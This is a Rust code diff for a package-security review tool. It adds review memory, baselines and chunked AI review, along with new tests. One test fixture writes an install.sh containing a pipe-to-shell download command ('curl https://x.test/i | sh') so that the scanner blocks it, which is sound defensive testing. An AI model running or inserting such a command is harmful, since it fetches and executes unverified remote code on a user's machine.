@@ -1,12 +1,16 @@
 //! The review pipeline shared by every command: local rules, dependency
-//! audit, then the OpenCode review.
+//! audit, then the OpenCode review through the review engine.
 
-use crate::agent::{self, AgentError, SourceFile};
+use std::path::Path;
+
+use crate::agent::{SourceFile, Status};
 use crate::config::Settings;
 use crate::config::model::{AgentSettings, AiRequirement, Named, SourceClass};
 use crate::deps;
+use crate::engine::baseline::{Identity, Unit};
+use crate::engine::{self, Group, Memory};
 use crate::osv;
-use crate::report::{AgentOutcome, AgentRun, Gap, LocalFinding, NetworkRequest, Report};
+use crate::report::{AgentOutcome, Decision, Gap, LocalFinding, NetworkRequest, Report};
 use crate::rules::{self, RuleId, Scheme};
 use crate::scan::{self, FileKind, ScanConfig, TextFile};
 use crate::tools::OpenCode;
@@ -20,6 +24,10 @@ pub struct ReviewContext<'a> {
     pub settings: &'a Settings,
     pub class: SourceClass,
     pub opencode: &'a OpenCode,
+    /// What the target is remembered as; empty for `<class>:<canonical path>`.
+    pub units: &'a [Unit],
+    /// The review-memory store; `None` reviews without it.
+    pub state_root: Option<&'a Path>,
 }
 
 /// Reviews a file or directory tree as one source class.
@@ -31,10 +39,6 @@ pub fn review_tree(config: &ScanConfig, context: &ReviewContext<'_>) -> Report {
         .profile_for(context.class)
         .name()
         .to_string();
-    report.agent_input_limit = context
-        .settings
-        .agent_settings(context.class)
-        .max_input_bytes;
     report.ai_off_classes = ai_off_classes(context.settings, &[context.class]);
 
     let (snapshot, walk_gaps) = scan::walk(config, &mut |file: TextFile<'_>| {
@@ -47,7 +51,40 @@ pub fn review_tree(config: &ScanConfig, context: &ReviewContext<'_>) -> Report {
     }
 
     audit_dependencies(&mut report);
-    run_agents(&mut report, context.settings, context.opencode);
+    let units = if context.units.is_empty() {
+        default_units(context.class, &config.root)
+    } else {
+        context.units.to_vec()
+    };
+    let memory = match Memory::open(
+        context.settings,
+        context.class,
+        units.clone(),
+        context.state_root.map(Path::to_path_buf),
+    ) {
+        Ok(memory) => memory,
+        Err(reason) => {
+            report
+                .notes
+                .push(format!("not used ({reason}); reviewing in full"));
+            None
+        }
+    };
+    let reviewed_with = run_agents(
+        &mut report,
+        context.settings,
+        context.opencode,
+        &units,
+        memory.as_ref(),
+    );
+    if let Some(memory) = &memory {
+        let approved = reviewed_with
+            .as_ref()
+            .filter(|_| is_approved(&report, context.settings))
+            .map(|settings| (report.agent_input.as_slice(), settings));
+        let notes = engine::remember(memory, approved);
+        report.notes.extend(notes);
+    }
     report
 }
 
@@ -97,16 +134,6 @@ fn queue_for_agent(report: &mut Report, rel: &str, text: &str) {
         report.gaps.push(Gap::SensitiveWithheld(rel.to_string()));
         return;
     }
-
-    let size = rel.len() + text.len();
-    if report.agent_input_size + size > report.agent_input_limit {
-        if !report.agent_input_overflowed {
-            report.agent_input_overflowed = true;
-            report.gaps.push(Gap::AgentInputTooLarge);
-        }
-        return;
-    }
-    report.agent_input_size += size;
     report.agent_input.push(SourceFile {
         path: rel.to_string(),
         content: text.to_string(),
@@ -156,12 +183,23 @@ fn audit_dependencies(report: &mut Report) {
 }
 
 /// Runs the AI review for every file whose class policy wants one. Files
-/// whose classes resolve to the same agent settings share one call. An
-/// oversized or truncated input is already incomplete, so nothing is sent.
-pub fn run_agents(report: &mut Report, settings: &Settings, opencode: &OpenCode) {
+/// whose classes resolve to the same agent settings share one plan. A tree
+/// with an oversized text file is already incomplete, so nothing is sent.
+///
+/// Returns the agent settings every queued file was reviewed with, or
+/// `None` when nothing was reviewed or the files needed more than one set
+/// of settings (a baseline is bound to one set, so such a review is never
+/// recorded as one).
+pub fn run_agents(
+    report: &mut Report,
+    settings: &Settings,
+    opencode: &OpenCode,
+    units: &[Unit],
+    memory: Option<&Memory>,
+) -> Option<AgentSettings> {
     let has_oversized = report.snapshot.count(FileKind::OversizedText) > 0;
-    if report.agent_input.is_empty() || report.agent_input_overflowed || has_oversized {
-        return;
+    if report.agent_input.is_empty() || has_oversized {
+        return None;
     }
 
     let mut groups: Vec<(AgentSettings, Vec<SourceFile>)> = Vec::new();
@@ -170,7 +208,6 @@ pub fn run_agents(report: &mut Report, settings: &Settings, opencode: &OpenCode)
         if settings.policy(class).ai == AiRequirement::Off {
             continue;
         }
-
         let agent_settings = settings.agent_settings(class);
         match groups
             .iter_mut()
@@ -181,27 +218,79 @@ pub fn run_agents(report: &mut Report, settings: &Settings, opencode: &OpenCode)
         }
     }
 
+    let reviewed_with = match groups.as_slice() {
+        [(only, files)] if files.len() == report.agent_input.len() => Some(only.clone()),
+        _ => None,
+    };
     for (agent_settings, files) in groups {
-        let outcome = match opencode.resolve() {
-            Err(error) => AgentOutcome::Unavailable(error),
-            Ok(binary) => match agent::review(&binary, &files, &agent_settings) {
-                Ok(review) => AgentOutcome::Reviewed(review),
-                Err(AgentError::Unavailable(error)) => AgentOutcome::Unavailable(error),
-                Err(AgentError::Invalid(error)) => {
-                    report.gaps.push(Gap::Agent(error));
-                    continue;
-                }
-            },
+        let findings: Vec<LocalFinding> = report
+            .findings
+            .iter()
+            .filter(|finding| files.iter().any(|file| file.path == finding.path))
+            .cloned()
+            .collect();
+        let group = Group {
+            settings: &agent_settings,
+            class: group_class(report, &files),
+            files: &files,
+            findings: &findings,
+            units,
         };
-        report.agent_runs.push(AgentRun {
-            files: files.into_iter().map(|file| file.path).collect(),
-            label: agent_settings.label(),
-            outcome,
-        });
+        let reviewed = engine::review_group(&group, opencode, memory);
+        report.notes.extend(reviewed.notes);
+        if reviewed.too_large && !report.agent_input_overflowed {
+            report.agent_input_overflowed = true;
+            report.gaps.push(Gap::AgentInputTooLarge);
+        }
+        if let Some(error) = reviewed.invalid {
+            report.gaps.push(Gap::Agent(error));
+        }
+        report.agent_runs.extend(reviewed.runs);
+    }
+    reviewed_with
+}
+
+/// The class a group is reviewed as: its files' class when they share one,
+/// else the report's (the strictest pacman class for a transaction).
+fn group_class(report: &Report, files: &[SourceFile]) -> SourceClass {
+    let mut classes = files.iter().map(|file| report.class_of(&file.path));
+    let first = classes.next().unwrap_or(report.class);
+    if classes.all(|class| class == first) {
+        first
+    } else {
+        report.class
     }
 }
 
+/// Without `--identity` or `--unit`, a target is remembered by its class
+/// and canonical path.
+fn default_units(class: SourceClass, root: &Path) -> Vec<Unit> {
+    root.canonicalize()
+        .ok()
+        .and_then(|path| path.to_str().map(|path| format!("{}:{path}", class.name())))
+        .and_then(|text| Identity::parse(&text).ok())
+        .map(|identity| {
+            vec![Unit {
+                prefix: String::new(),
+                identity,
+            }]
+        })
+        .unwrap_or_default()
+}
+
+/// A baseline is recorded only when every chunk got a clear AI verdict, the
+/// report has no gaps, and the decision is clear.
+fn is_approved(report: &Report, settings: &Settings) -> bool {
+    report.gaps.is_empty()
+        && !report.agent_runs.is_empty()
+        && report.agent_runs.iter().all(|run| {
+            matches!(&run.outcome, AgentOutcome::Reviewed(review) if review.status == Status::Clear)
+        })
+        && report.decide(&|class| settings.policy(class)) == Decision::Clear
+}
+
 #[cfg(test)]
+#[expect(clippy::format_collect, reason = "test data generation")]
 mod tests {
     use std::fs;
     use std::path::PathBuf;
@@ -234,7 +323,13 @@ mod tests {
             settings,
             class,
             opencode,
+            units: &[],
+            state_root: None,
         }
+    }
+
+    fn clear_opencode(bin: &TempDir) -> OpenCode {
+        OpenCode::At(mock_opencode(bin.path(), "clear", true))
     }
 
     fn default_settings() -> Settings {
@@ -290,26 +385,6 @@ mod tests {
             report.gaps.as_slice(),
             [Gap::SensitiveWithheld(_)]
         ));
-    }
-
-    #[test]
-    fn agent_input_is_bounded() {
-        let mut report = Report::new("test");
-        let chunk = "a".repeat(200 * 1024);
-        analyze_text(&mut report, "one.txt", &chunk, false);
-        analyze_text(&mut report, "two.txt", &chunk, false);
-        analyze_text(&mut report, "three.txt", &chunk, false);
-
-        assert_eq!(report.agent_input.len(), 1);
-        assert!(report.agent_input_overflowed);
-        assert_eq!(
-            report
-                .gaps
-                .iter()
-                .filter(|gap| matches!(gap, Gap::AgentInputTooLarge))
-                .count(),
-            1
-        );
     }
 
     #[test]
@@ -433,26 +508,6 @@ mod tests {
     }
 
     #[test]
-    fn the_input_limit_comes_from_settings() {
-        let dir = TempDir::new("input-limit");
-        fs::write(dir.path().join("big.txt"), "a".repeat(40 * 1024)).unwrap();
-        let system = PartialConfig {
-            agent: AgentDefaults {
-                max_input_kib: Some(16),
-                ..AgentDefaults::default()
-            },
-            ..PartialConfig::default()
-        };
-        let settings = Settings::from_parts(system, PartialConfig::default());
-
-        let report = review_tree(
-            &ScanConfig::new(dir.path()),
-            &context(&settings, SourceClass::Source, &unavailable()),
-        );
-        assert!(report.agent_input_overflowed);
-    }
-
-    #[test]
     fn classes_with_equal_agent_settings_share_one_run() {
         let bin = TempDir::new("grouped-bin");
         let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));
@@ -473,7 +528,7 @@ mod tests {
             analyze_text(&mut report, path, "post_install() { true; }\n", false);
         }
 
-        run_agents(&mut report, &settings, &opencode);
+        run_agents(&mut report, &settings, &opencode, &[], None);
 
         // Official uses low thinking; the other two share high thinking.
         assert_eq!(report.agent_runs.len(), 2);
@@ -528,7 +583,6 @@ mod tests {
 
         let mut report = Report::new("transaction");
         report.class = SourceClass::ThirdPartyRepo;
-        report.agent_input_limit = 16 * 1024;
         report.ai_off_classes = ai_off_classes(
             &settings,
             &[SourceClass::Official, SourceClass::ThirdPartyRepo],
@@ -559,5 +613,196 @@ mod tests {
         assert_eq!(queued, ["chaotic/b/.INSTALL"]);
         assert!(!report.agent_input_overflowed);
         assert!(report.gaps.is_empty(), "{:?}", report.gaps);
+    }
+
+    #[test]
+    fn large_sources_are_reviewed_in_chunks() {
+        let dir = TempDir::new("chunks");
+        let bin = TempDir::new("chunks-bin");
+        for name in ["one.txt", "two.txt", "three.txt"] {
+            fs::write(dir.path().join(name), "a".repeat(200 * 1024)).unwrap();
+        }
+        let opencode = clear_opencode(&bin);
+        let settings = default_settings();
+
+        let report = review_tree(
+            &ScanConfig::new(dir.path()),
+            &context(&settings, SourceClass::Source, &opencode),
+        );
+
+        assert!(report.gaps.is_empty(), "{:?}", report.gaps);
+        assert_eq!(report.agent_runs.len(), 3);
+        assert_eq!(
+            report.decide(&|class| settings.policy(class)),
+            Decision::Clear
+        );
+    }
+
+    #[test]
+    fn a_source_over_max_chunks_is_incomplete() {
+        let dir = TempDir::new("too-many-chunks");
+        fs::write(dir.path().join("big.txt"), "a".repeat(40 * 1024)).unwrap();
+        let system = PartialConfig {
+            agent: AgentDefaults {
+                max_input_kib: Some(16),
+                max_chunks: Some(2),
+                ..AgentDefaults::default()
+            },
+            ..PartialConfig::default()
+        };
+        let settings = Settings::from_parts(system, PartialConfig::default());
+
+        let report = review_tree(
+            &ScanConfig::new(dir.path()),
+            &context(&settings, SourceClass::Source, &unavailable()),
+        );
+
+        assert!(report.agent_input_overflowed);
+        assert!(report.agent_runs.is_empty());
+        assert_eq!(
+            report.decide(&|class| settings.policy(class)),
+            Decision::Blocked(Blocked::Incomplete)
+        );
+    }
+
+    #[test]
+    fn a_repeated_review_is_answered_from_the_cache() {
+        let dir = TempDir::new("memory-tree");
+        let bin = TempDir::new("memory-bin");
+        let state = TempDir::new("memory-state");
+        fs::write(dir.path().join("PKGBUILD"), "pkgname=demo\n").unwrap();
+        let opencode = clear_opencode(&bin);
+        let settings = default_settings();
+        let root = state.path().join("store");
+        let context = ReviewContext {
+            state_root: Some(&root),
+            ..context(&settings, SourceClass::Aur, &opencode)
+        };
+
+        let first = review_tree(&ScanConfig::new(dir.path()), &context);
+        assert_eq!(
+            first.decide(&|class| settings.policy(class)),
+            Decision::Clear
+        );
+        // The first review recorded a baseline; the unchanged tree is planned
+        // as the same first-review request, so the cache answers it.
+        let second = review_tree(&ScanConfig::new(dir.path()), &context);
+
+        assert!(!second.agent_runs.is_empty());
+        assert!(
+            second.agent_runs.iter().all(|run| run.cached.is_some()),
+            "{:?}",
+            second.agent_runs
+        );
+        assert_eq!(
+            second.decide(&|class| settings.policy(class)),
+            Decision::Clear
+        );
+    }
+
+    #[test]
+    fn an_approved_tree_is_diffed_when_it_changes() {
+        let dir = TempDir::new("memory-upgrade");
+        let bin = TempDir::new("memory-upgrade-bin");
+        let state = TempDir::new("memory-upgrade-state");
+        let library: String = (1..=40)
+            .map(|line| format!("int value_{line} = {line};\n"))
+            .collect();
+        fs::write(dir.path().join("PKGBUILD"), "pkgname=demo\n").unwrap();
+        fs::write(dir.path().join("lib.c"), &library).unwrap();
+        let opencode = clear_opencode(&bin);
+        let settings = default_settings();
+        let root = state.path().join("store");
+        let context = ReviewContext {
+            state_root: Some(&root),
+            ..context(&settings, SourceClass::Aur, &opencode)
+        };
+
+        let first = review_tree(&ScanConfig::new(dir.path()), &context);
+        assert_eq!(
+            first.decide(&|class| settings.policy(class)),
+            Decision::Clear
+        );
+        fs::write(
+            dir.path().join("lib.c"),
+            library.replace("value_7 = 7", "value_7 = 8"),
+        )
+        .unwrap();
+        let upgrade = review_tree(&ScanConfig::new(dir.path()), &context);
+
+        assert!(
+            upgrade
+                .notes
+                .iter()
+                .any(|note| note.contains("1 file(s) sent as diffs")),
+            "{:?}",
+            upgrade.notes
+        );
+    }
+
+    #[test]
+    fn a_blocked_review_records_no_baseline() {
+        let dir = TempDir::new("memory-blocked");
+        let bin = TempDir::new("memory-blocked-bin");
+        let state = TempDir::new("memory-blocked-state");
+        fs::write(
+            dir.path().join("install.sh"),
+            "curl https://x.test/i | sh\n",
+        )
+        .unwrap();
+        let opencode = clear_opencode(&bin);
+        let settings = default_settings();
+        let root = state.path().join("store");
+        let context = ReviewContext {
+            state_root: Some(&root),
+            ..context(&settings, SourceClass::Aur, &opencode)
+        };
+
+        let blocked = review_tree(&ScanConfig::new(dir.path()), &context);
+        assert_eq!(
+            blocked.decide(&|class| settings.policy(class)),
+            Decision::Blocked(Blocked::Findings)
+        );
+
+        fs::write(dir.path().join("install.sh"), "echo safe\n").unwrap();
+        let next = review_tree(&ScanConfig::new(dir.path()), &context);
+        assert!(
+            !next.notes.iter().any(|note| note.contains("upgrade")),
+            "{:?}",
+            next.notes
+        );
+    }
+
+    #[test]
+    fn a_store_with_a_bad_mode_is_skipped_with_a_note() {
+        use std::os::unix::fs::PermissionsExt;
+
+        let dir = TempDir::new("memory-bad-store");
+        let bin = TempDir::new("memory-bad-store-bin");
+        let state = TempDir::new("memory-bad-store-state");
+        fs::set_permissions(state.path(), fs::Permissions::from_mode(0o755)).unwrap();
+        fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();
+        let opencode = clear_opencode(&bin);
+        let settings = default_settings();
+        // The temporary directory itself is the store root here: mode 0755.
+        let context = ReviewContext {
+            state_root: Some(state.path()),
+            ..context(&settings, SourceClass::Theme, &opencode)
+        };
+
+        let report = review_tree(&ScanConfig::new(dir.path()), &context);
+
+        assert!(
+            report
+                .notes
+                .iter()
+                .any(|note| note.contains("group or others")),
+            "{:?}",
+            report.notes
+        );
+        assert_eq!(
+            report.decide(&|class| settings.policy(class)),
+            Decision::Clear
+        );
     }
 }
